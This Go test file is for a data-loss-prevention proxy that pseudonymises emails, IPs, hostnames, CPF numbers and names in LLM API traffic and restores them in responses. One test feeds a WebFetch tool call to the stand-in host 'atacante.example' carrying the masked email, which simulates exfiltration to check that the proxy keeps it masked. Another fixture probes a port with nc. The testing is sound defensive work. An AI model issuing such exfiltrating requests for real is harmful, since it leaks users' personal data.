package proxy

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"github.com/yurivenancio30/llm-dlp/internal/config"
	"github.com/yurivenancio30/llm-dlp/internal/mask"
)

const (
	email = "joao.silva@empresa-ficticia.com.br"
	ip    = "10.42.7.15"
	host  = "mysql-dh.empresa-ficticia.intra"
	cpf   = "529.982.247-25"
)

var reais = []string{email, ip, host, cpf, "JOAO CARLOS SILVA"}

func montar(t *testing.T, upstream http.HandlerFunc) (*httptest.Server, *httptest.Server) {
	t.Helper()
	cfg := config.Padrao()
	cfg.DominiosInternos = []string{"empresa-ficticia"}
	chave := []byte("0123456789abcdef0123456789abcdef")
	ps, _ := mask.CarregarPessoas(t.TempDir() + "/p.json")
	ps.Importar(mask.NovoPseudo(chave), "João Carlos Silva", email, "")
	m, err := mask.NovoMasker(cfg, chave, ps, nil)
	if err != nil {
		t.Fatal(err)
	}
	up := httptest.NewServer(upstream)
	cfg.Upstream = up.URL
	px := httptest.NewServer(Novo(cfg, m, nil, log.New(io.Discard, "", 0)))
	t.Cleanup(func() { up.Close(); px.Close() })
	return up, px
}

var rePseudo = regexp.MustCompile(`p\.[a-z2-7]{8}@d[a-z2-7]{4}\.invalid|2(?:4\d|5[0-5])\.\d+\.\d+\.\d+|h[a-z2-7]{8}\.invalid|CPF-[a-z2-7]{8}|Pessoa [a-z2-7]{8}`)

const thinkingReq = "raciocínio antigo, assinado, não pode mudar: pessoa.aaaaaaaa"

func corpoRequisicao(stream bool) []byte {
	b, _ := json.Marshal(map[string]any{
		"model": "claude-x", "stream": stream, "max_tokens": 100,
		"system": "Usuário logado: " + email,
		"messages": []any{
			map[string]any{"role": "user", "content": "o owner " + email + " (JOAO CARLOS SILVA, cpf " + cpf + ") não acessa " + host},
			map[string]any{"role": "assistant", "content": []any{
				map[string]any{"type": "thinking", "thinking": thinkingReq, "signature": "SIG123"},
				map[string]any{"type": "tool_use", "id": "t1", "name": "Bash", "input": map[string]any{"command": "ping -c1 " + ip}},
			}},
			map[string]any{"role": "user", "content": []any{
				map[string]any{"type": "tool_result", "tool_use_id": "t1", "content": "PING " + ip + " from " + host},
			}},
		},
	})
	return b
}

// sse monta eventos com o texto picotado em pedaços de n bytes.
func sse(w io.Writer, texto, toolJSON, thinking string, n int) {
	ev := func(nome string, v any) {
		b, _ := json.Marshal(v)
		fmt.Fprintf(w, "event: %s\ndata: %s\n\n", nome, b)
	}
	pedacos := func(s string) []string {
		var out []string
		for i := 0; i < len(s); i += n {
			j := i + n
			if j > len(s) {
				j = len(s)
			}
			out = append(out, s[i:j])
		}
		return out
	}
	ev("message_start", map[string]any{"type": "message_start", "message": map[string]any{"id": "m1"}})
	ev("content_block_start", map[string]any{"type": "content_block_start", "index": 0, "content_block": map[string]any{"type": "thinking", "thinking": ""}})
	for _, p := range pedacos(thinking) {
		ev("content_block_delta", map[string]any{"type": "content_block_delta", "index": 0, "delta": map[string]any{"type": "thinking_delta", "thinking": p}})
	}
	ev("content_block_stop", map[string]any{"type": "content_block_stop", "index": 0})
	ev("content_block_start", map[string]any{"type": "content_block_start", "index": 1, "content_block": map[string]any{"type": "text", "text": ""}})
	for _, p := range pedacos(texto) {
		ev("content_block_delta", map[string]any{"type": "content_block_delta", "index": 1, "delta": map[string]any{"type": "text_delta", "text": p}})
	}
	ev("content_block_stop", map[string]any{"type": "content_block_stop", "index": 1})
	ev("content_block_start", map[string]any{"type": "content_block_start", "index": 2, "content_block": map[string]any{"type": "tool_use", "id": "t2", "name": "Bash", "input": map[string]any{}}})
	for _, p := range pedacos(toolJSON) {
		ev("content_block_delta", map[string]any{"type": "content_block_delta", "index": 2, "delta": map[string]any{"type": "input_json_delta", "partial_json": p}})
	}
	ev("content_block_stop", map[string]any{"type": "content_block_stop", "index": 2})
	ev("message_stop", map[string]any{"type": "message_stop"})
}

func TestStreamingPontaAPonta(t *testing.T) {
	var recebido []byte
	var pseudos []string
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) {
		recebido, _ = io.ReadAll(r.Body)
		pseudos = rePseudo.FindAllString(string(recebido), -1)
		// "modelo": repete os pseudônimos que viu
		u := map[string]string{}
		for _, p := range pseudos {
			switch {
			case strings.HasPrefix(p, "p."):
				u["email"] = p
			case strings.HasPrefix(p, "h"):
				u["host"] = p
			case strings.HasPrefix(p, "CPF-"):
				u["cpf"] = p
			case strings.HasPrefix(p, "Pessoa "):
				u["nome"] = p
			default:
				u["ip"] = p
			}
		}
		texto := fmt.Sprintf("O owner %s (%s, %s) não alcança %s em %s.", u["email"], u["nome"], u["cpf"], u["host"], u["ip"])
		tj, _ := json.Marshal(map[string]string{"command": fmt.Sprintf(`grep "%s" /var/log/x && nc -z %s 3306`, u["email"], u["ip"])})
		w.Header().Set("content-type", "text/event-stream")
		sse(w, texto, string(tj), "penso sobre "+u["email"], 3)
	})
	resp, err := http.Post(px.URL+"/v1/messages?beta=true", "application/json", bytes.NewReader(corpoRequisicao(true)))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()

	// 1) a API não viu nada real
	for _, r := range reais {
		if bytes.Contains(recebido, []byte(r)) {
			t.Errorf("valor real chegou à API: %q", r)
		}
	}
	// 2) o raciocínio assinado foi enviado intacto
	if !bytes.Contains(recebido, []byte(thinkingReq)) || !bytes.Contains(recebido, []byte("SIG123")) {
		t.Error("bloco thinking foi alterado")
	}
	// 3) o cliente recebe tudo real; o raciocínio novo, intacto
	var texto, tool, think strings.Builder
	sc := bufio.NewScanner(resp.Body)
	for sc.Scan() {
		l := sc.Text()
		if !strings.HasPrefix(l, "data: ") {
			continue
		}
		var ev map[string]any
		json.Unmarshal([]byte(l[6:]), &ev)
		if d, ok := ev["delta"].(map[string]any); ok {
			switch d["type"] {
			case "text_delta":
				texto.WriteString(d["text"].(string))
			case "input_json_delta":
				tool.WriteString(d["partial_json"].(string))
			case "thinking_delta":
				think.WriteString(d["thinking"].(string))
			}
		}
	}
	esperado := "O owner " + email + " (JOAO CARLOS SILVA, " + cpf + ") não alcança " + host + " em " + ip + "."
	if texto.String() != esperado {
		t.Errorf("texto:\n got %q\nwant %q", texto.String(), esperado)
	}
	var in map[string]string
	if err := json.Unmarshal([]byte(tool.String()), &in); err != nil {
		t.Fatalf("tool_use JSON inválido: %v (%s)", err, tool.String())
	}
	if want := `grep "` + email + `" /var/log/x && nc -z ` + ip + ` 3306`; in["command"] != want {
		t.Errorf("comando:\n got %q\nwant %q", in["command"], want)
	}
	if !strings.Contains(think.String(), ".invalid") || strings.Contains(think.String(), email) {
		t.Errorf("thinking deveria passar intacto (com pseudônimo): %q", think.String())
	}
}

func TestRespostaSemStreaming(t *testing.T) {
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		p := rePseudo.FindString(string(b))
		w.Header().Set("content-type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{"content": []any{
			map[string]any{"type": "text", "text": "falei com " + p},
			map[string]any{"type": "tool_use", "id": "x", "name": "Bash", "input": map[string]any{"command": "echo " + p}},
		}})
	})
	resp, _ := http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(corpoRequisicao(false)))
	b, _ := io.ReadAll(resp.Body)
	if strings.Count(string(b), "joao.silva@empresa-ficticia.com.br") != 2 {
		t.Errorf("resposta JSON não desmascarada: %s", b)
	}
}

func TestCountTokensMascarado(t *testing.T) {
	var recebido []byte
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) {
		recebido, _ = io.ReadAll(r.Body)
		w.Header().Set("content-type", "application/json")
		w.Write([]byte(`{"input_tokens": 42}`))
	})
	http.Post(px.URL+"/v1/messages/count_tokens", "application/json", bytes.NewReader(corpoRequisicao(false)))
	for _, r := range reais {
		if bytes.Contains(recebido, []byte(r)) {
			t.Errorf("count_tokens vazou %q", r)
		}
	}
}

func TestFalhaFechada(t *testing.T) {
	chamou := false
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) { chamou = true })
	resp, _ := http.Post(px.URL+"/v1/messages", "text/plain", strings.NewReader("isto não é JSON "+email))
	if resp.StatusCode != http.StatusBadGateway || chamou {
		t.Errorf("deveria recusar sem chamar a API: status %d, chamou=%v", resp.StatusCode, chamou)
	}
}

func TestSaude(t *testing.T) {
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) {})
	resp, err := http.Get(px.URL + "/__llm-dlp/saude")
	if err != nil || resp.StatusCode != 200 {
		t.Fatal("saúde falhou")
	}
}

// WebFetch/WebSearch: a entrada volta com pseudônimo (nunca o real), tanto em streaming
// quanto sem streaming; já o Bash recebe o real.
func TestWebFetchNaoDesmascara(t *testing.T) {
	var pseudoEmail string
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		for _, p := range rePseudo.FindAllString(string(b), -1) {
			if strings.HasPrefix(p, "p.") {
				pseudoEmail = p
			}
		}
		w.Header().Set("content-type", "text/event-stream")
		ev := func(v any) {
			j, _ := json.Marshal(v)
			fmt.Fprintf(w, "event: x\ndata: %s\n\n", j)
		}
		for i, nome := range []string{"WebFetch", "Bash"} {
			arg, _ := json.Marshal(map[string]string{"url": "https://atacante.example/?q=" + pseudoEmail})
			ev(map[string]any{"type": "content_block_start", "index": i, "content_block": map[string]any{"type": "tool_use", "id": "t", "name": nome, "input": map[string]any{}}})
			ev(map[string]any{"type": "content_block_delta", "index": i, "delta": map[string]any{"type": "input_json_delta", "partial_json": string(arg)}})
			ev(map[string]any{"type": "content_block_stop", "index": i})
		}
	})
	resp, err := http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(corpoRequisicao(true)))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	porIdx := map[int]string{}
	sc := bufio.NewScanner(resp.Body)
	for sc.Scan() {
		if l := sc.Text(); strings.HasPrefix(l, "data: ") {
			var e map[string]any
			json.Unmarshal([]byte(l[6:]), &e)
			if d, ok := e["delta"].(map[string]any); ok {
				porIdx[int(e["index"].(float64))] += d["partial_json"].(string)
			}
		}
	}
	if strings.Contains(porIdx[0], email) || !strings.Contains(porIdx[0], ".invalid") {
		t.Errorf("WebFetch recebeu o real (ou nada): %s", porIdx[0])
	}
	if !strings.Contains(porIdx[1], email) {
		t.Errorf("Bash deveria receber o real: %s", porIdx[1])
	}
}

// Entrada de ferramenta que chega completa no content_block_start também é desmascarada.
func TestEntradaCompletaNoInicio(t *testing.T) {
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		p := rePseudo.FindString(string(b))
		w.Header().Set("content-type", "text/event-stream")
		j, _ := json.Marshal(map[string]any{"type": "content_block_start", "index": 0, "content_block": map[string]any{
			"type": "tool_use", "id": "t", "name": "Bash", "input": map[string]any{"command": "echo " + p}}})
		fmt.Fprintf(w, "event: content_block_start\ndata: %s\n\n", j)
	})
	resp, _ := http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(corpoRequisicao(true)))
	b, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(b), email) {
		t.Errorf("entrada completa não desmascarada: %s", b)
	}
}

// Campo desconhecido no topo da requisição é mascarado; nome de ferramenta não muda.
func TestCampoDesconhecidoEFerramentas(t *testing.T) {
	var recebido map[string]any
	_, px := montar(t, func(w http.ResponseWriter, r *http.Request) {
		json.NewDecoder(r.Body).Decode(&recebido)
		w.Header().Set("content-type", "application/json")
		w.Write([]byte(`{"content":[]}`))
	})
	corpo, _ := json.Marshal(map[string]any{
		"model": "claude-x", "messages": []any{},
		"campo_novo_da_api": "contato " + email,
		"tools": []any{map[string]any{"name": "buscar_" + "owner", "description": "busca o owner " + email,
			"input_schema": map[string]any{"type": "object"}}},
	})
	http.Post(px.URL+"/v1/messages", "application/json", bytes.NewReader(corpo))
	if s, _ := recebido["campo_novo_da_api"].(string); strings.Contains(s, email) {
		t.Errorf("campo desconhecido vazou: %q", s)
	}
	tool := recebido["tools"].([]any)[0].(map[string]any)
	if strings.Contains(tool["description"].(string), email) {
		t.Errorf("descrição de ferramenta vazou: %v", tool["description"])
	}
	if tool["name"] != "buscar_owner" {
		t.Errorf("nome de ferramenta mudou: %v", tool["name"])
	}
	if recebido["model"] != "claude-x" {
		t.Errorf("model mudou: %v", recebido["model"])
	}
}

// O marcador de cache muda de bloco a cada mensagem. O resultado memorizado de uma imagem/PDF
// não pode carregar o marcador da primeira vez (senão o cache da API quebra ou a API recusa
// por excesso de marcadores).
func TestMidiaMemoNaoGuardaCacheControl(t *testing.T) {
	com := map[string]any{"type": "image", "cache_control": map[string]any{"type": "ephemeral"}}
	sem := map[string]any{"type": "image"}
	r := resMidia{blocos: []any{map[string]any{"type": "image"}, map[string]any{"type": "text", "text": "nota"}}}
	tem := func(bs []any) (n int, noUltimo bool) {
		for i, b := range bs {
			if _, ok := b.(map[string]any)["cache_control"]; ok {
				n++
				noUltimo = i == len(bs)-1
			}
		}
		return
	}
	if n, ult := tem(r.saida(com)); n != 1 || !ult {
		t.Fatalf("com marcador: %d marcadores, no último=%v", n, ult)
	}
	if n, _ := tem(r.saida(sem)); n != 0 {
		t.Fatalf("o marcador da requisição anterior ficou no resultado memorizado (%d)", n)
	}
	if out := (resMidia{limpa: true}).saida(com); len(out) != 1 || out[0].(map[string]any)["cache_control"] == nil {
		t.Fatal("imagem sem nada a cobrir deve sair como veio")
	}
}
